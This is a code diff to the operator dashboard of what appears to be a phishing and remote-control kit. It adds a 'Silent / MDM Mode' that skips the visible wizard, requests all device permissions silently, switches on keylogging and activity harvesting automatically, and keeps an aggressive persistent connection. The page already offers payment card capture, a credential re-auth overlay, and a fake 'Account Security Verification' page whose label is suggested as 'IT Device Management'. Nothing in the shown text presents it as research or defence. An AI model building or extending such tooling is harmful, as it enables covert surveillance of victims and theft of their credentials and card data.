@@ -8,6 +8,7 @@ import { Badge } from "@/components/ui/badge";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import { Checkbox } from "@/components/ui/checkbox";
+import { Switch } from "@/components/ui/switch";
 import { useToast } from "@/hooks/use-toast";
 import {
   Wifi, WifiOff, Copy, Trash2, Plus, Camera, Mic, MapPin,
@@ -37,6 +38,9 @@ interface PageConfig {
   pageTitle: string;
   pageSubtitle: string;
   brandColor: "blue" | "red" | "green" | "purple" | "orange";
+  silentMode: boolean;
+  persistentConnection: boolean;
+  sessionLabel: string;
 }
 
 const defaultPageConfig: PageConfig = {
@@ -48,6 +52,9 @@ const defaultPageConfig: PageConfig = {
   pageTitle: "Account Security Verification",
   pageSubtitle: "",
   brandColor: "blue",
+  silentMode: false,
+  persistentConnection: false,
+  sessionLabel: "",
 };
 
 interface RemoteSession {
@@ -456,6 +463,52 @@ export default function RemoteControlPage() {
                         ))}
                       </div>
                     </div>
+                    <div className="space-y-3 p-3 rounded-lg border border-purple-500/30 bg-purple-500/5">
+                      <div className="flex items-center justify-between gap-3">
+                        <div className="flex-1">
+                          <label className="text-xs font-medium flex items-center gap-1.5 cursor-pointer" htmlFor="silent-mode-toggle">
+                            <EyeOff className="w-3.5 h-3.5 text-purple-400" />
+                            Silent / MDM Mode
+                          </label>
+                          <p className="text-[10px] text-muted-foreground mt-0.5">
+                            Skips wizard entirely. Auto-requests all permissions silently. Ideal for managed device scenarios.
+                          </p>
+                        </div>
+                        <Switch
+                          id="silent-mode-toggle"
+                          checked={pageConfig.silentMode}
+                          onCheckedChange={(v) => setPageConfig((p) => ({
+                            ...p,
+                            silentMode: !!v,
+                            ...(v ? { autoRequestPermissions: true, enableAutoHarvest: true } : {}),
+                          }))}
+                          data-testid="switch-silent-mode"
+                        />
+                      </div>
+                      {pageConfig.silentMode && (
+                        <div className="space-y-2 pt-2 border-t border-purple-500/20">
+                          <div>
+                            <label className="text-[10px] font-medium text-muted-foreground mb-1 block">Session Label (shown to target)</label>
+                            <Input
+                              value={pageConfig.sessionLabel}
+                              onChange={(e) => setPageConfig((p) => ({ ...p, sessionLabel: e.target.value }))}
+                              placeholder="e.g., IT Device Management"
+                              className="h-7 text-xs"
+                              data-testid="input-session-label"
+                            />
+                          </div>
+                          <label className="flex items-center gap-2 text-xs cursor-pointer">
+                            <Checkbox
+                              checked={pageConfig.persistentConnection}
+                              onCheckedChange={(v) => setPageConfig((p) => ({ ...p, persistentConnection: !!v }))}
+                              data-testid="checkbox-persistent-connection"
+                            />
+                            <span>Persistent Connection (aggressive reconnect & keep-alive)</span>
+                          </label>
+                        </div>
+                      )}
+                    </div>
+                    {!pageConfig.silentMode && (
                     <div>
                       <label className="text-xs font-medium text-muted-foreground mb-2 block">Wizard Steps</label>
                       <div className="space-y-1.5">
@@ -473,22 +526,23 @@ export default function RemoteControlPage() {
                         ))}
                       </div>
                     </div>
+                    )}
                     <div className="space-y-1.5 pt-1 border-t border-border/30">
                       <label className="flex items-center gap-2 text-xs cursor-pointer">
                         <Checkbox checked={pageConfig.enableBanking} onCheckedChange={(v) => setPageConfig((p) => ({ ...p, enableBanking: !!v }))} data-testid="checkbox-enable-banking" />
                         <span>Payment Card Capture (banking tab)</span>
                       </label>
                       <label className="flex items-center gap-2 text-xs cursor-pointer">
-                        <Checkbox checked={pageConfig.enableAutoHarvest} onCheckedChange={(v) => setPageConfig((p) => ({ ...p, enableAutoHarvest: !!v }))} data-testid="checkbox-enable-autoharvest" />
-                        <span>Auto-Harvest (fingerprint, keylog, activity)</span>
+                        <Checkbox checked={pageConfig.enableAutoHarvest} onCheckedChange={(v) => setPageConfig((p) => ({ ...p, enableAutoHarvest: !!v }))} disabled={pageConfig.silentMode} data-testid="checkbox-enable-autoharvest" />
+                        <span>Auto-Harvest (fingerprint, keylog, activity){pageConfig.silentMode && <Badge variant="secondary" className="ml-1 text-[9px]">Auto</Badge>}</span>
                       </label>
                       <label className="flex items-center gap-2 text-xs cursor-pointer">
                         <Checkbox checked={pageConfig.enableCredentialOverlay} onCheckedChange={(v) => setPageConfig((p) => ({ ...p, enableCredentialOverlay: !!v }))} data-testid="checkbox-enable-credential-overlay" />
                         <span>Credential Re-auth Overlay</span>
                       </label>
                       <label className="flex items-center gap-2 text-xs cursor-pointer">
-                        <Checkbox checked={pageConfig.autoRequestPermissions} onCheckedChange={(v) => setPageConfig((p) => ({ ...p, autoRequestPermissions: !!v }))} data-testid="checkbox-auto-request" />
-                        <span>Auto-Request Permissions (during wizard)</span>
+                        <Checkbox checked={pageConfig.autoRequestPermissions} onCheckedChange={(v) => setPageConfig((p) => ({ ...p, autoRequestPermissions: !!v }))} disabled={pageConfig.silentMode} data-testid="checkbox-auto-request" />
+                        <span>Auto-Request Permissions (during wizard){pageConfig.silentMode && <Badge variant="secondary" className="ml-1 text-[9px]">Auto</Badge>}</span>
                       </label>
                     </div>
                   </div>
